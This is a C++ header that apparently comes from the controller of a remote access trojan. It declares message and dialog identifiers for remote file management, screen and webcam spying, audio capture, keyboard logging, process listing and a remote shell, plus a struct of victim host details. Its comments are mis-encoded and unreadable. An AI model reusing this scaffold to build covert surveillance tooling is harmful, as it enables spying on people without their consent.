#pragma once
#include "IOCPServer.h"
enum 
{
	WM_CLIENT_CONNECT = WM_APP + 0x1001,
	WM_CLIENT_CLOSE,
	WM_CLIENT_NOTIFY,
	WM_DATA_IN_MSG,
	WM_DATA_OUT_MSG,


	WM_ADDTOLIST = WM_USER + 102,	// ��ӵ��б���ͼ��
	WM_REMOVEFROMLIST,				// ���б���ͼ��ɾ��
	WM_OPENMANAGERDIALOG,			// ��һ���ļ�������
	WM_OPENSCREENSPYDIALOG,			// ��һ����Ļ���Ӵ���
	WM_OPENWEBCAMDIALOG,			// ������ͷ���Ӵ���
	WM_OPENAUDIODIALOG,				// ��һ��������������
	WM_OPENKEYBOARDDIALOG,			// �򿪼��̼�¼����
	WM_OPENPSLISTDIALOG,			// �򿪽��̹�����
	WM_OPENSHELLDIALOG,				// ��shell����
	WM_RESETPORT,					// �ı�˿�
	//////////////////////////////////////////////////////////////////////////
	FILEMANAGER_DLG = 1,
	SCREENSPY_DLG,
	WEBCAM_DLG,
	AUDIO_DLG,
	KEYBOARD_DLG,
	SYSTEM_DLG,
	SHELL_DLG
};

typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	int				CPUClockMhz;	// CPU��Ƶ
	IN_ADDR			IPAddress;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[50];	// ������
	bool			bIsWebCam;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
}LOGININFO;